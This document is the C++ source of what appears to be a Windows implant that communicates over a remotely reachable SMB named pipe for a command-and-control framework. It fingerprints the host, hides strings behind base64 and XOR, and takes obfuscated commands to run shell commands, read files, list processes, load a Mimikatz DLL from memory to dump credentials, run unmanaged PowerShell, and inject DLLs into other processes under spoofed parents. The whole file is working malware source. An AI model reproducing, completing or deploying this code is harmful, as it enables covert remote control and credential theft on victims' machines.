// Source.cpp : This file contains the 'main' function. Program execution begins and ends there.

// This sets us up for WinXP use
#define NTDDI_VERSION NTDDI_WINXPSP3
#define _WIN32_WINNT 0x0501

#define WIN32_LEAN_AND_MEAN
#include <winsock.h>

#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <WinInet.h>
#include <string>
#include <cstdlib>
#include <ctime>
#include <random>
#include <chrono>
#include <thread>
#include <stdlib.h>
#include <vector>
#include <sstream>
#include <direct.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <comdef.h>

// my libraries
#include "Base64.hpp"
#include "CurrDir.hpp"
#include "Elevated.hpp"
#include "Encrypt.hpp"
#include "EnumPipes.hpp"
#include "Exec.hpp"
#include "GetDate.hpp"
#include "GetIP.hpp"
#include "IGeneral.hpp"
#include "I.hpp"
#include "IC.hpp"
#include "Json.hpp"
#include "ListDir.hpp"
#include "LibraryLoad.hpp"
#include "Message.hpp"
#include "ProcessEnum.hpp"
#include "Random.hpp"
#include "SacProc.hpp"
#include "Source.h"
#include "VirtualDLL.hpp"

// for convenience
using json = nlohmann::json;
using namespace std;

#ifdef DLL_MODE
extern "C" __declspec(dllexport)
#endif
void main(int argc, char* argv[])
{
	srand(time(NULL));
#ifdef _DEBUG
	string name = "\\\\.\\pipe\\WindowsPipe";
#else
	string name = "\\\\.\\pipe\\ec450b1fcbd2f6cecefcfc4cae52284b";
#endif

	//Setup Post Data
	//Get user and hosntame
#define INFO_BUFFER_SIZE 64
	TCHAR  hostBuf[INFO_BUFFER_SIZE];
	TCHAR  userBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCountHost = INFO_BUFFER_SIZE;
	DWORD  bufCharCountUser = INFO_BUFFER_SIZE;
	DWORD bufSize = MAX_PATH;
	TCHAR domainNameBuf[MAX_PATH];
	GetComputerNameEx(ComputerNameDnsDomain, domainNameBuf, &bufSize);
	GetComputerName(hostBuf, &bufCharCountHost);
	GetUserName(userBuf, &bufCharCountUser);
	//Get IP
	string ip = getMyIP();
	//Get if admin
	bool isadmin = IsElevated();
	string admin = "false";
	if (isadmin == 1)
	{
		admin = "true";
	}
	//Create our unique identifier.  Not a true uuid, we just call it this.
	string uuid = random_string(32);
	//Get arch
#if defined(_WIN64)
	string arch = "64";  // 64-bit programs run only on Win64
#elif defined(_WIN32)
	string arch = "32";
#endif
	//get pid
	DWORD pid = GetCurrentProcessId();
	string current_pid = to_string(pid);
	TCHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	char drive[128];
	char dir[128];
	char fname[128];
	char ext[128];

	_splitpath(
		szFileName,
		drive,
		dir,
		fname,
		ext
	);

	string domain = (string)domainNameBuf;
	if (*domainNameBuf == 0) {
		domain = hostBuf;
	}

	VirtualDll mim_dll;
	VirtualDll ups_dll;

	string inType = encryptDecrypt(base64_decode("FTcQNB5TREU="));
	string ppid = encryptDecrypt(base64_decode("AiYXOw9eQg=="));
	string sac64 = encryptDecrypt(base64_decode("JXktBiZuYUgUJD8HAwZlOh8iIwlGU0xJcgwsLAZOAzEXOw9eQg8fODU="));
	string sac32 = encryptDecrypt(base64_decode("JXktBiZuYUgUJD8HAwZlOh8iIwllWVZMdAwsLAZOAzEXOw9eQg8fODU="));

	string optionsString =
		"{"
		"\"inType\":\"" + inType + "\","
		"\"ppid\":\"" + ppid + "\","
		"\"sac64\":\"" + sac64 + "\","
		"\"sac32\":\"" + sac32 + "\""
		"}";
	json options = json::parse(optionsString);

	HANDLE mainPipe;
	// Call the static method of the class
	char buffer[256];
	DWORD dwRead;
	DWORD dwWritten;

	mainPipe = CreateNamedPipe(TEXT(name.c_str()),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,   // FILE_FLAG_FIRST_PIPE_INSTANCE is not needed but forces CreateNamedPipe(..) to fail if the pipe already exists...
		PIPE_UNLIMITED_INSTANCES,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);

	DWORD dwWrittenNew;
	while (mainPipe != INVALID_HANDLE_VALUE)
	{
		//Dynamic post vars below
		//setup entropy
		string entropy = " ";
		int Min = 0;
		int Max = 64;
		int n = rand() % (Max + 1 - Min) + Min;
		for (int i = 0; i < n; ++i)
		{
			entropy += " ";
		}
		//Get dateTime
		string time_now = dateTime();
		//Get Named Pipes
		vector<string> pipes = EnumeratePipes();
		string mrunning = "false";
		string psrunning = "false";
		if (std::find(pipes.begin(), pipes.end(), "Pipe") != pipes.end())
		{
			psrunning = "true";
		}
		if (std::find(pipes.begin(), pipes.end(), "LocalPipe") != pipes.end())
		{
			mrunning = "true";
		}
		//Get injected DLLs
		string upsLoaded = "false";
		string mLoaded = "false";
		if (ups_dll.isLoaded()) {
			upsLoaded = "true";
		}
		if (mim_dll.isLoaded()) {
			mLoaded = "true";
		}

		string hostJSON = encryptDecrypt(base64_decode("DiwCLg=="));
		string hostnameJSON = encryptDecrypt(base64_decode("DiwCLhRTW0Q="));
		string ipJSON = encryptDecrypt(base64_decode("DzM="));
		string userJSON = encryptDecrypt(base64_decode("EzAUKA=="));
		string platformJSON = encryptDecrypt(base64_decode("Fi8QLhxdREw="));
		string adminJSON = encryptDecrypt(base64_decode("ByccMxQ="));
		string uuidJSON = encryptDecrypt(base64_decode("EzYYPg=="));
		string timeJSON = encryptDecrypt(base64_decode("EiocPw=="));
		string entropyJSON = encryptDecrypt(base64_decode("Ay0FKBVCTw=="));
		string pidJSON = encryptDecrypt(base64_decode("FioV"));
		string procnameJSON = encryptDecrypt(base64_decode("FjEeORRTW0Q="));
		string psrunningJSON = encryptDecrypt(base64_decode("FjADLxRcX08d"));
		string mrunningJSON = encryptDecrypt(base64_decode("CzEENBRbWEY="));
		string upsLoadedJSON = encryptDecrypt(base64_decode("EzMCFhVTUkQe"));
		string mLoadedJSON = encryptDecrypt(base64_decode("Cw8eOx5XUg=="));
		string type = "smb";

		string post_data = "{\"" + hostJSON + "\":{\"" + hostnameJSON + "\":\"" + (string)hostBuf +
			"\",\"" + ipJSON + "\":\"" + ip +
			"\",\"" + userJSON + "\":\"" + domain + "\\\\" + userBuf +
			"\",\"" + platformJSON + "\":\"win" + arch +
			"\",\"" + adminJSON + "\":\"" + admin +
			"\",\"" + uuidJSON + "\":\"" + uuid +
			"\",\"" + timeJSON + "\":\"" + time_now +
			"\",\"" + entropyJSON + "\":\"" + entropy +
			"\",\"" + pidJSON + "\":\"" + current_pid +
			"\",\"" + procnameJSON + "\":\"" + fname +
			"\",\"" + psrunningJSON + "\":\"" + psrunning +
			"\",\"" + mrunningJSON + "\":\"" + mrunning +
			"\",\"" + upsLoadedJSON + "\":\"" + upsLoaded +
			"\",\"" + mLoadedJSON + "\":\"" + mLoaded +
			"\",\"" + "type" + "\":\"" + type +
			"\"}}";

		DWORD readPeek;
		BOOL fileRead = FALSE;
		if (ConnectNamedPipe(mainPipe, NULL) != FALSE)
		{
			/*int msgboxID = MessageBoxA(
				NULL,
				"received",
				"Client Sent",
				MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
			);*/

			int bufferSize;
			int bufferWritten = 0;
			std::string final;
			while (TRUE) {
				fileRead = ReadFile(mainPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
				buffer[dwRead] = '\0';
				string stringBuffer = buffer;
				if (stringBuffer.find("size") != std::string::npos) {
					json dataSize = json::parse(stringBuffer);
					string size = dataSize["size"];
					bufferSize = atoi(size.c_str());
					//bufferSize = atoi(stringBuffer.c_str());
				}
				else {
					final += buffer;
					bufferWritten += dwRead;
					//PeekNamedPipe(mainPipe, NULL, 0, NULL, &readPeek, NULL);
					if (bufferWritten >= bufferSize) {
						break;
					}
				}
			}
			final += "\0";

			//BOOL read = ReadFile(mainPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
			//buffer[dwRead] = '\0';

			if (fileRead)
			{
					//string converted(buffer);
					json return_data_dic = json::parse(final);
					string return_data = encryptDecrypt(base64_decode(return_data_dic["response"]));

					json exec_data = json::parse(return_data);
					json post_data_parse = json::parse(post_data);

					std::vector<string> results_data;

					if (exec_data.find("05d7cabfc666b7dca18eb59d155be124") != exec_data.end()) { //set
						for (auto const& s : exec_data["05d7cabfc666b7dca18eb59d155be124"]) {
							string option = s["option"];
							string value = s["value"];
							if (options.find(option) != options.end()) {
								options[option] = value;
								results_data.push_back("Options set successfully.");
								results_data.push_back(options.dump(-1, ' ', false, json::error_handler_t::ignore));
							}
							else {
								results_data.push_back("Failed to set options, provided option does not exist.");
								results_data.push_back(options.dump(-1, ' ', false, json::error_handler_t::ignore));
							}
						}
					}

					if (exec_data.find("42a805da0b27007d4f02d0ecab9b5ce3") != exec_data.end()) { //exec
						for (auto const& s : exec_data["42a805da0b27007d4f02d0ecab9b5ce3"]) {
							string command = s;
							string result;
							result = exec(s);

							results_data.push_back((string)result);
						}
					}

					if (exec_data.find("940a987b3fe113ede40266f583741df9") != exec_data.end()) { //cd
						string directory = exec_data["940a987b3fe113ede40266f583741df9"];
						int success = _chdir(directory.c_str());
						results_data.push_back("Now in: " + directory);
					}

					if (exec_data.find("e8e0822326d9e3d3a7d2818769470cbc") != exec_data.end()) { //cat
						for (auto const& s : exec_data["e8e0822326d9e3d3a7d2818769470cbc"]) {
							string file = s;
							OFSTRUCT buffer;
							HFILE hfile = OpenFile(file.c_str(), &buffer, OF_READ);
							char buffer_read[2048];
							DWORD bytes_read = 0;
							bool flag = ReadFile((HANDLE)hfile, &buffer_read, 2048, &bytes_read, NULL);
							if (bytes_read != 0) {
								buffer_read[bytes_read] = 0;
							}

							CloseHandle((HANDLE)hfile);
							if (flag != 0) {
								std::string str(buffer_read);
								results_data.push_back(str);
							}
							else {
								results_data.push_back("Could not read file: " + file);
							}
						}
					}

					if (exec_data.find("05095c55757d514f7123a3e08175ca3a") != exec_data.end()) { //ps
						string procs = list_running_processes();
						results_data.push_back(procs);
					}

					if (exec_data.find("a268ee76cc22048f86a5a905b32814bb") != exec_data.end()) { //pwd
						string directory = workingdir();
						results_data.push_back("Currently in: " + directory);
					}

					if (exec_data.find("a5ced20888db593ae38dafe5182f3cc5") != exec_data.end()) { //ls
						for (auto const& s : exec_data["a5ced20888db593ae38dafe5182f3cc5"]) {
							string directory = s;
							if (directory == ".") {
								directory = workingdir();
							}
							string files = get_all_files_names_within_folder(directory);
							results_data.push_back("Enumerating " + directory + "\n" + files);
						}
					}

					if (exec_data.find("1eef4289d54dcfdcdb2c799ce232ca58") != exec_data.end()) { //message
						string message = exec_data["1eef4289d54dcfdcdb2c799ce232ca58"]["message"];
						const char* message_cstr = message.c_str();
						size_t length = strlen(message_cstr);

						//Turn this into jobs
						LPVOID arg = (LPVOID)VirtualAllocEx(GetCurrentProcess(), NULL, length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
						int n = WriteProcessMemory(GetCurrentProcess(), arg, message_cstr, length, NULL);
						CreateThread(NULL, 0, &CreateMessageBox, arg, 0, NULL);

						results_data.push_back("[+] MessageBox Created!");
					}

					if (exec_data.find("920017de3c6a8433b8cb22f9545f97be") != exec_data.end()) { //mimikatz
						for (auto const& s : exec_data["920017de3c6a8433b8cb22f9545f97be"]) {
							string return_string = "";
							string command = s["command"];
							const char* command_cstr = command.c_str();
							size_t length = strlen(command_cstr);

							if (mim_dll.isLoaded() == false) {
								UINT_PTR ptr = mim_dll.getOrLoadBase64(s["dll"]);
								return_string = return_string + "[+] DLL Loaded!\n";
							}

							if (command == "unload") {
								mim_dll.unload();
								results_data.push_back("[-] Cannot unload ever.");
							}
							else if (mim_dll.isLoaded()) {
								mFunctions me = reinterpret_cast<mFunctions>(mim_dll["exec"]);
								string narrow_string(command);
								wstring wide_string = wstring(narrow_string.begin(), narrow_string.end());
								const wchar_t* szName = wide_string.c_str();

								wchar_t* data = (*me)(szName);
								wstring ws(data);
								string str(ws.begin(), ws.end());
								return_string = return_string + str;
								results_data.push_back(return_string);
							}
							else {
								results_data.push_back("[-] Unable to load.");
							}
						}
					}

					if (exec_data.find("369fe3167dd3846d129e071d05dff0ba") != exec_data.end()) { //unmanaged powershell (ups)
						for (auto const& s : exec_data["369fe3167dd3846d129e071d05dff0ba"]) {
							string return_string = "";
							string command = s["command"];
							const char* command_cstr = command.c_str();
							size_t length = strlen(command_cstr);

							if (ups_dll.isLoaded() == false) {
								UINT_PTR ptr = ups_dll.getOrLoadBase64(s["dll"]);
								return_string = return_string + "[+] Loaded!\n";
							}

							if (command == "unload") {
								ups_dll.unload();
								results_data.push_back("[-] Cannot unload ever.");
							}
							else if (ups_dll.isLoaded()) {
								pFunctions me = reinterpret_cast<pFunctions>(ups_dll["exec"]);
								string data = (*me)(command);
								return_string = return_string + data;
								results_data.push_back(return_string);
							}
							else {
								results_data.push_back("[-] Unable to load.");
							}
						}
					}

					if (exec_data.find("7b6243c5bf0a48e6b78f60c3d37b3fb0") != exec_data.end()) { //inject
						for (auto const& s : exec_data["7b6243c5bf0a48e6b78f60c3d37b3fb0"]) {
							string base64_data = s["dll"];
							string raw_data = base64_decode(base64_data);
							string arch = s["arch"];
							if (options["inType"] == "standard") {
								int inject_pid;
								if (s["pid"] == "sac") {
									inject_pid = startSacProcess(arch, options["ppid"], options["sac64"], options["sac32"]);
								}
								else {
									inject_pid = s["pid"];
								}
								string results = inject(inject_pid, raw_data.c_str(), raw_data.size(), arch);
								results_data.push_back(results);
							}
							else if (options["inType"] == "context") {
								int inject_pid;
								if (s["pid"] == "sac") {
									inject_pid = startSacProcess(arch, options["ppid"], options["sac64"], options["sac32"]);
								}
								else {
									inject_pid = s["pid"];
								}
								string results = injectContext(inject_pid, raw_data.c_str(), raw_data.size(), arch);
								results_data.push_back(results);
							}
							else {
								results_data.push_back("inType option is invalid, double check.");
							}
						}
					}

					if (exec_data.find("995f7ce14c94639e0ef66a5b9b55c3ac") != exec_data.end()) { //mimiInject
						for (auto const& s : exec_data["995f7ce14c94639e0ef66a5b9b55c3ac"]) {
							string mimicmd = s["cmd"];
							int cmdlength = s["length"];

							HANDLE hPipe;
							char buffer[4096];
							DWORD dwRead;
							DWORD dwWritten;

							Sleep(1000);
							hPipe = CreateFile(TEXT("\\\\.\\pipe\\LocalPipe"),
								GENERIC_READ | GENERIC_WRITE,
								0,
								NULL,
								OPEN_EXISTING,
								0,
								NULL);

							if (hPipe != INVALID_HANDLE_VALUE) {
								WriteFile(hPipe,
									mimicmd.c_str(),
									cmdlength,
									&dwWritten,
									NULL);
								string final;
								while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE) {
									buffer[dwRead] = '\0';
									/* do something with data in buffer */
									final += buffer;
								}
								final += "\0";
								results_data.push_back(final);

								CloseHandle(hPipe);
							}
						}
					}

					if (exec_data.find("cc7152e8e85d74fe5a275d5e9335008f") != exec_data.end()) { //psinject
						for (auto const& s : exec_data["cc7152e8e85d74fe5a275d5e9335008f"]) {
							string pickcmd = s["cmd"];
							int cmdlength = s["length"];

							HANDLE hPipe;
							char buffer[8192];
							DWORD dwRead;
							DWORD dwWritten;

							Sleep(1000);
							hPipe = CreateFile(TEXT("\\\\.\\pipe\\Pipe"),
								GENERIC_READ | GENERIC_WRITE,
								0,
								NULL,
								OPEN_EXISTING,
								0,
								NULL);

							if (hPipe != INVALID_HANDLE_VALUE) {
								WriteFile(hPipe,
									pickcmd.c_str(),
									cmdlength,
									&dwWritten,
									NULL);
								string final;
								while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE) {
									buffer[dwRead] = '\0';
									/* do something with data in buffer */
									final += buffer;
								}
								final += "\0";
								results_data.push_back(final);

								CloseHandle(hPipe);
							}
						}
					}

					if (exec_data.find("4cc6791e40eaacf7aa591b48a397ae7c") != exec_data.end()) { //exit
						results_data.push_back("Exiting.");

						json results_post;
						results_post["results"] = results_data;
						results_post[hostJSON] = post_data_parse[hostJSON];
						string results_post_final = results_post.dump();
						WriteFile(mainPipe,
							results_post_final.c_str(),
							results_post_final.length(),   // = length of string + terminating '\0' !!!
							&dwWrittenNew,
							NULL);
						while (PeekNamedPipe(mainPipe, NULL, 0, NULL, &readPeek, NULL) != FALSE) {
							;
						}
						DisconnectNamedPipe(mainPipe);
						CloseHandle(mainPipe);
						if (exec_data["4cc6791e40eaacf7aa591b48a397ae7c"] == "1") {
							ExitProcess(0);
						}
						break;
					}

					//Reassign new changes!
					if (ups_dll.isLoaded()) {
						upsLoaded = "true";
					}
					if (mim_dll.isLoaded()) {
						mLoaded = "true";
					}
					vector<string> pipes = EnumeratePipes();
					string mrunning = "false";
					string psrunning = "false";
					if (std::find(pipes.begin(), pipes.end(), "Pipe") != pipes.end())
					{
						psrunning = "true";
					}
					if (std::find(pipes.begin(), pipes.end(), "LocalPipe") != pipes.end())
					{
						mrunning = "true";
					}

					post_data_parse[hostJSON][upsLoadedJSON] = upsLoaded;
					post_data_parse[hostJSON][mLoadedJSON] = mLoaded;
					post_data_parse[hostJSON][psrunningJSON] = psrunning;
					post_data_parse[hostJSON][mrunningJSON] = mrunning;

					json results_post;
					results_post["results"] = results_data;
					results_post[hostJSON] = post_data_parse[hostJSON];
					string results_post_final = results_post.dump(-1, ' ', false, json::error_handler_t::ignore);


					//Return Data
					//string post_data_return = "{\"request\":\"" + base64_encode(encryptDecrypt(results_post_final)) + "\"}";
					WriteFile(mainPipe,
						results_post_final.c_str(),
						results_post_final.length(),   // = length of string + terminating '\0' !!!
						&dwWrittenNew,
						NULL);
			}
		}
		if (PeekNamedPipe(mainPipe, NULL, 0, NULL, &readPeek, NULL) == FALSE) {
			DisconnectNamedPipe(mainPipe);
		}
		//DisconnectNamedPipe(mainPipe); // Do we need this like this?
	}
}

